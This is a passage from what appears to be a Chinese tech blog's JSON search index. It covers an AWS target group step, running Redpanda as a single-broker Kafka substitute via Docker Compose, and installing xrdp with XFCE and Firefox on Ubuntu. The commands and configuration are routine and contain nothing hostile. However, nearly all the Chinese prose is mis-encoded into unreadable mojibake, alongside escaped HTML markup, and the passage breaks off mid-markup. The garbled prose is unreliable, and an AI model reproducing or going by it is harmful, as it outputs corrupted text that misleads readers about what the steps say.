src=\"/posts/20250521-aws_endpoint/image-20250521101324400.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåˆ°æœ€åäº†ï¼Œå±…ç„¶è¿˜æ²¡æœ‰target groupï¼Œé‚£åˆè¦å»ºä¸€ä¸ªäº†ï¼Œç‚¹å‡»Create target groupå»ºç«‹\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101429096\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101429096.png\"\u003e\u003c/p\u003e\n\u003cp\u003e3ã€å»ºç«‹target group\u003c/p\u003e\n\u003cp\u003eåå­—å«åšï¼špostgres-target-group\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬é€‰IP addressesï¼Œå› ä¸ºè¦è¿åˆ°åé¢çš„postgresæœåŠ¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250521101530207\" loading=\"lazy\" src=\"/posts/20250521-aws_endpoint/image-20250521101530207.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åé€‰å¥½TCPï¼ŒPort 5432ï¼Œ IPV4ï¼ŒVPCï¼Œå…¶å®ƒä¿æŒç¼ºçœï¼Œç„¶åå»ºç«‹\u003c/p\u003e","title":"AWSçš„è·¨è´¦å·è®¿é—®ä¸åŒVPCåŸŸä¸­çš„æœåŠ¡"},{"content":"å…¬å¸çš„ä¸€ä¸ªå…¬ç½‘è¦æ¬åˆ°å†…ç½‘çš„ä¸€ä¸ªRancheré›†ç¾¤ä¸Šï¼Œå¾ˆç¹ç\nåŸæœ‰çš„æ¶æ„æœ‰kafkaï¼Œè¦åœ¨å†…ç½‘å¤ç°ä¸€ä¸ªå‡ºæ¥\né‚£3èŠ‚ç‚¹çš„kafkaå’Œ3èŠ‚ç‚¹çš„zookeeperï¼ŒçœŸçš„æ˜¯ä¸æƒ³æ­å•Š\næœå•Šæœå•Šæœå•Šæœï¼Œç»ˆäºæ‰¾åˆ°è‹¥å¹²å¹³æ›¿ï¼š\nRedis çš„å¹³æ›¿ Dragonfly Mongo çš„å¹³æ›¿ FerretDB Kafka çš„å¹³æ›¿ Redpanda é‚£å°±é€‰å®šç”¨Redpandaæ¥æï¼Œæ–¹æ³•è¿˜æ˜¯æœ‰ä¸€äº›æ›²æŠ˜çš„ï¼š\nRedpanda åœ¨ 2025å¹´5æœˆ16æ—¥è¿™ä¸ªèŠ‚ç‚¹ï¼Œæœ‰5ä¸ªç‰ˆæœ¬\næœ€æ–°çš„25.1çš„ç‰ˆæœ¬ï¼Œå¦‚æœç”¨docker composeæ¥å¯åŠ¨ï¼Œæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå¥½å¤šæ–‡ä»¶ã€‚\næ•°æ®ç›˜æœ‰ä¸‰ä¸ªäº†ï¼Œè€Œä¸”ç”¨åˆ°äº†minioåšåç«¯çš„æŒä¹…åŒ–å·ï¼Œè¿™ä¹ˆå¤æ‚ï¼Œé‚£ä¸å¦‚ç›´æ¥æKafkaäº†\né‚£åªèƒ½å¾€å‰å›é€€ï¼Œé€‰ç”¨24.2çš„ç‰ˆæœ¬ï¼Œdocker compose å°±ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªç‰ˆæœ¬ 2025å¹´7æœˆ31æ—¥å°±ç»ˆç»“æ”¯æŒäº†ã€‚\nä¸‹è½½çš„è¯ï¼šhttps://docs.redpanda.com/24.2/get-started/quick-start/\næˆ‘ä»¬è¦çš„æ˜¯ä¸€ä¸ªbrokerçš„ï¼Œé‚£ç›´æ¥ç»™å‡ºæºæ–‡ä»¶\nname: redpanda-quickstart-one-broker networks: redpanda_network: driver: bridge volumes: redpanda-0: null services: redpanda-0: command: - redpanda - start - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092 # Address the broker advertises to clients that connect to the Kafka API. # Use the internal addresses to connect to the Redpanda brokers\u0026#39; # from inside the same Docker network. # Use the external addresses to connect to the Redpanda brokers\u0026#39; # from outside the Docker network. - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092 - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082 # Address the broker advertises to clients that connect to the HTTP Proxy. - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082 - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081 # Redpanda brokers use the RPC API to communicate with each other internally. - --rpc-addr redpanda-0:33145 - --advertise-rpc-addr redpanda-0:33145 # Mode dev-container uses well-known configuration properties for development in containers. - --mode dev-container # Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system. - --smp 1 - --default-log-level=info image: docker.redpanda.com/redpandadata/redpanda:v25.1.4 container_name: redpanda-0 volumes: - redpanda-0:/var/lib/redpanda/data networks: - redpanda_network ports: - 18081:18081 - 18082:18082 - 19092:19092 - 19644:9644 console: container_name: redpanda-console image: docker.redpanda.com/redpandadata/console:v3.1.0 networks: - redpanda_network entrypoint: /bin/sh command: -c \u0026#39;echo \u0026#34;$$CONSOLE_CONFIG_FILE\u0026#34; \u0026gt; /tmp/config.yml; /app/console\u0026#39; environment: CONFIG_FILEPATH: /tmp/config.yml CONSOLE_CONFIG_FILE: | kafka: brokers: [\u0026#34;redpanda-0:9092\u0026#34;] schemaRegistry: enabled: true urls: [\u0026#34;http://redpanda-0:8081\u0026#34;] redpanda: adminApi: enabled: true urls: [\u0026#34;http://redpanda-0:9644\u0026#34;] ports: - 8080:8080 depends_on: - redpanda-0 ä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œè¿™é‡Œé¢æœ‰é—®é¢˜ï¼Œå·æ˜¯ç©ºçš„ï¼Œè¿™å¯ä¸è¡Œï¼Œå¿…é¡»æŒä¹…åŒ–åˆ°æœ¬åœ°ï¼Œæ”¹ä¸€ä¸‹\nvolumes: redpanda-0: driver: local driver_opts: type: none device: /data/redpanda/data o: bind ç„¶åç›´æ¥å¯åŠ¨ï¼š\ndocker compose up -d å…¶å®æ˜¯å¯åŠ¨äº†ä¸¤ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªæ•°æ®ç«¯ï¼›ä¸€ä¸ªæ˜¯consoleï¼Œå®¢æˆ·ç«¯\næˆ‘ä»¬æ‰“å¼€8080 webçš„ç«¯å£ï¼Œé‚£å®¢æˆ·ç«¯å‘¢ï¼Œè¿çš„å°±æ˜¯19092ç«¯å£ï¼Œç”¨æ³•è·Ÿkafkaå®Œå…¨ä¸€æ ·ã€‚\n","permalink":"https://rendoumi.com/posts/20250516-redpanda/","summary":"\u003cp\u003eå…¬å¸çš„ä¸€ä¸ªå…¬ç½‘è¦æ¬åˆ°å†…ç½‘çš„ä¸€ä¸ªRancheré›†ç¾¤ä¸Šï¼Œå¾ˆç¹ç\u003c/p\u003e\n\u003cp\u003eåŸæœ‰çš„æ¶æ„æœ‰kafkaï¼Œè¦åœ¨å†…ç½‘å¤ç°ä¸€ä¸ªå‡ºæ¥\u003c/p\u003e\n\u003cp\u003eé‚£3èŠ‚ç‚¹çš„kafkaå’Œ3èŠ‚ç‚¹çš„zookeeperï¼ŒçœŸçš„æ˜¯ä¸æƒ³æ­å•Š\u003c/p\u003e\n\u003cp\u003eæœå•Šæœå•Šæœå•Šæœï¼Œç»ˆäºæ‰¾åˆ°è‹¥å¹²å¹³æ›¿ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRedis çš„å¹³æ›¿ Dragonfly\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eMongo çš„å¹³æ›¿ FerretDB\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eKafka çš„å¹³æ›¿ Redpanda\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£å°±é€‰å®šç”¨\u003ccode\u003eRedpanda\u003c/code\u003eæ¥æï¼Œæ–¹æ³•è¿˜æ˜¯æœ‰ä¸€äº›æ›²æŠ˜çš„ï¼š\u003c/p\u003e\n\u003cp\u003eRedpanda åœ¨ 2025å¹´5æœˆ16æ—¥è¿™ä¸ªèŠ‚ç‚¹ï¼Œæœ‰5ä¸ªç‰ˆæœ¬\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250516151644197\" loading=\"lazy\" src=\"/posts/20250516-redpanda/image-20250516151644197.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæœ€æ–°çš„25.1çš„ç‰ˆæœ¬ï¼Œå¦‚æœç”¨docker composeæ¥å¯åŠ¨ï¼Œæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œå¥½å¤šæ–‡ä»¶ã€‚\u003c/p\u003e\n\u003cp\u003eæ•°æ®ç›˜æœ‰ä¸‰ä¸ªäº†ï¼Œè€Œä¸”ç”¨åˆ°äº†minioåšåç«¯çš„æŒä¹…åŒ–å·ï¼Œè¿™ä¹ˆå¤æ‚ï¼Œé‚£ä¸å¦‚ç›´æ¥æKafkaäº†\u003c/p\u003e\n\u003cp\u003eé‚£åªèƒ½å¾€å‰å›é€€ï¼Œé€‰ç”¨24.2çš„ç‰ˆæœ¬ï¼Œdocker compose å°±ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸è¿‡è¿™ä¸ªç‰ˆæœ¬ 2025å¹´7æœˆ31æ—¥å°±ç»ˆç»“æ”¯æŒäº†ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹è½½çš„è¯ï¼šhttps://docs.redpanda.com/24.2/get-started/quick-start/\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬è¦çš„æ˜¯ä¸€ä¸ªbrokerçš„ï¼Œé‚£ç›´æ¥ç»™å‡ºæºæ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ename: redpanda-quickstart-one-broker\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetworks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda_network:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    driver: bridge\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evolumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda-0: null\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservices:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  redpanda-0:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - start\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --kafka-addr internal://0.0.0.0:9092,external://0.0.0.0:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Address the broker advertises to clients that connect to the Kafka API.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Use the internal addresses to connect to the Redpanda brokers\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# from inside the same Docker network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Use the external addresses to connect to the Redpanda brokers\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# from outside the Docker network.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-kafka-addr internal://redpanda-0:9092,external://localhost:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --pandaproxy-addr internal://0.0.0.0:8082,external://0.0.0.0:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Address the broker advertises to clients that connect to the HTTP Proxy.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-pandaproxy-addr internal://redpanda-0:8082,external://localhost:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --schema-registry-addr internal://0.0.0.0:8081,external://0.0.0.0:18081\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Redpanda brokers use the RPC API to communicate with each other internally.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --rpc-addr redpanda-0:33145\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --advertise-rpc-addr redpanda-0:33145\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Mode dev-container uses well-known configuration properties for development in containers.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --mode dev-container\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"c1\"\u003e# Tells Seastar (the framework Redpanda uses under the hood) to use 1 core on the system.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --smp \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - --default-log-level\u003cspan class=\"o\"\u003e=\u003c/span\u003einfo\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: docker.redpanda.com/redpandadata/redpanda:v25.1.4\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: redpanda-0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    volumes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda-0:/var/lib/redpanda/data\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda_network\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 18081:18081\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 18082:18082\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 19092:19092\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 19644:9644\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  console:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    container_name: redpanda-console\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    image: docker.redpanda.com/redpandadata/console:v3.1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    networks:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda_network\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    entrypoint: /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    command: -c \u003cspan class=\"s1\"\u003e\u0026#39;echo \u0026#34;$$CONSOLE_CONFIG_FILE\u0026#34; \u0026gt; /tmp/config.yml; /app/console\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    environment:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CONFIG_FILEPATH: /tmp/config.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      CONSOLE_CONFIG_FILE: \u003cspan class=\"p\"\u003e|\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        kafka:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          brokers: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;redpanda-0:9092\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        schemaRegistry:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          urls: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://redpanda-0:8081\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        redpanda:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e          adminApi:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            enabled: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            urls: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http://redpanda-0:9644\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - 8080:8080\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    depends_on:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      - redpanda-0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»”ç»†çœ‹äº†ä¸€ä¸‹ï¼Œè¿™é‡Œé¢æœ‰é—®é¢˜ï¼Œå·æ˜¯ç©ºçš„ï¼Œè¿™å¯ä¸è¡Œï¼Œå¿…é¡»æŒä¹…åŒ–åˆ°æœ¬åœ°ï¼Œæ”¹ä¸€ä¸‹\u003c/p\u003e","title":"kafkaçš„æµ‹è¯•æ›¿ä»£å“-redpanda"},{"content":"éå¸¸éƒé—·çš„ä¸€ä»¶äº‹ã€‚å…¬å¸çš„ç½‘ç»œæ¶æ„éå¸¸æœ‰æ„æ€ï¼Œçµæ´»æ€§æå¤§ã€‚å¯¼è‡´æˆ‘è¿™ä¸ªæ€»åœ¨å…¬å¸ä¹‹å¤–ç”¨openvpnè¿è¿›å»çš„äººå¾ˆç—›è‹¦ï¼Œæ— æ³•å¤ç°åŒäº‹æå‡ºçš„é—®é¢˜ã€‚\næ²¡åŠæ³•ï¼Œéœ€è¦åœ¨å…¬å¸ç½‘ç»œå†…éƒ¨æœ‰å°æµ‹è¯•æœºï¼Œé‚£å®é™…æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œä½†éƒ½æ˜¯debianæˆ–è€…ubuntuçš„ï¼Œè€Œé—®é¢˜ååæ˜¯ç½‘é¡µæ‰“ä¸å¼€çš„é—®é¢˜ã€‚\né‚£å°±å¹²è„†æ‰¾ä¸€å°Ubuntuï¼Œå®‰è£…ä¸€ä¸‹è¿œç¨‹æ¡Œé¢ï¼Œç”¨RDP 3389è¿è¿›å»ï¼Œå¯åŠ¨ä¸€ä¸ªFirefoxï¼Œè¿›è¡Œæµ‹è¯•å³å¯ã€‚\næ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€å‡çº§ubuntuåˆ°æœ€æ–°\nsudo apt update sudo apt upgrade -y äºŒã€å®‰è£…xrdp\nsudo apt install xrdp -y ä¸‰ã€å®‰è£…æ¡Œé¢ç¯å¢ƒxfce\nsudo apt install xfce4 xfce4-goodies -y å››ã€é…ç½®xfceä½¿ç”¨xrdp\necho xfce4-session \u0026gt; ~/.xsession # å°†æœ€åä¸€è¡Œæ›¿æ¢æ‰ sudo vi /etc/xrdp/startwm.sh #exec /bin/sh /etc/X11/Xsession exec startxfce4 äº”ã€è®¾ç½®xrdpæœåŠ¡è‡ªå¯åŠ¨\nsudo systemctl enable xrdp sudo systemctl start xrdp å…­ã€å¦‚æœæœ‰é˜²ç«å¢™ï¼Œè®°å¾—æ”¾å¼€3389çš„tcpç«¯å£\nä¸ƒã€æŠŠç”¨æˆ·åŠ å…¥ssl-certç»„\n# è¿™é‡Œæˆ‘çš„ç™»å½•ç”¨æˆ·æ˜¯debian sudo adduser debian ssl-cert # åŠ ç»„ä¸ç”¨é‡å¯ï¼Œå¦‚æœ‰å…¶å®ƒæ”¹åŠ¨éœ€è¦é‡å¯ sudo systemctl restart xrdp å…«ã€å®‰è£…Firefox\nsudo apt install firefox-esr ä¹ã€å¼€è¿œç¨‹æ¡Œé¢ï¼Œè¿ä¸Šå»ï¼Œå¼€ä¸ªå‘½ä»¤è¡Œæ‰§è¡Œfirefox-esr\n","permalink":"https://rendoumi.com/posts/20250516-ubuntu_rdp/","summary":"\u003cp\u003eéå¸¸éƒé—·çš„ä¸€ä»¶äº‹ã€‚å…¬å¸çš„ç½‘ç»œæ¶æ„éå¸¸æœ‰æ„æ€ï¼Œçµæ´»æ€§æå¤§ã€‚å¯¼è‡´æˆ‘è¿™ä¸ªæ€»åœ¨å…¬å¸ä¹‹å¤–ç”¨\u003ccode\u003eopenvpn\u003c/code\u003eè¿è¿›å»çš„äººå¾ˆç—›è‹¦ï¼Œæ— æ³•å¤ç°åŒäº‹æå‡ºçš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eæ²¡åŠæ³•ï¼Œéœ€è¦åœ¨å…¬å¸ç½‘ç»œå†…éƒ¨æœ‰å°æµ‹è¯•æœºï¼Œé‚£å®é™…æ˜¯æœ‰å¾ˆå¤šçš„ï¼Œä½†éƒ½æ˜¯debianæˆ–è€…ubuntuçš„ï¼Œè€Œé—®é¢˜ååæ˜¯ç½‘é¡µæ‰“ä¸å¼€çš„é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å°±å¹²è„†æ‰¾ä¸€å°Ubuntuï¼Œå®‰è£…ä¸€ä¸‹è¿œç¨‹æ¡Œé¢ï¼Œç”¨RDP 3389è¿è¿›å»ï¼Œå¯åŠ¨ä¸€ä¸ªFirefoxï¼Œè¿›è¡Œæµ‹è¯•å³å¯ã€‚\u003c/p\u003e\n\u003cp\u003eæ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€å‡çº§ubuntuåˆ°æœ€æ–°\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt upgrade -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eäºŒã€å®‰è£…xrdp\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install xrdp -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸‰ã€å®‰è£…æ¡Œé¢ç¯å¢ƒxfce\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install xfce4 xfce4-goodies -y\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå››ã€é…ç½®xfceä½¿ç”¨xrdp\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e xfce4-session \u0026gt; ~/.xsession\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å°†æœ€åä¸€è¡Œæ›¿æ¢æ‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo vi /etc/xrdp/startwm.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#exec /bin/sh /etc/X11/Xsession\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexec\u003c/span\u003e startxfce4\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"image-20250516102445030\" loading=\"lazy\" src=\"/posts/20250516-ubuntu_rdp/image-20250516102445030.png\"\u003e\u003c/p\u003e\n\u003cp\u003eäº”ã€è®¾ç½®xrdpæœåŠ¡è‡ªå¯åŠ¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e xrdp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo systemctl start xrdp\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå…­ã€å¦‚æœæœ‰é˜²ç«å¢™ï¼Œè®°å¾—æ”¾å¼€3389çš„tcpç«¯å£\u003c/p\u003e\n\u003cp\u003eä¸ƒã€æŠŠç”¨æˆ·åŠ å…¥ssl-certç»„\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 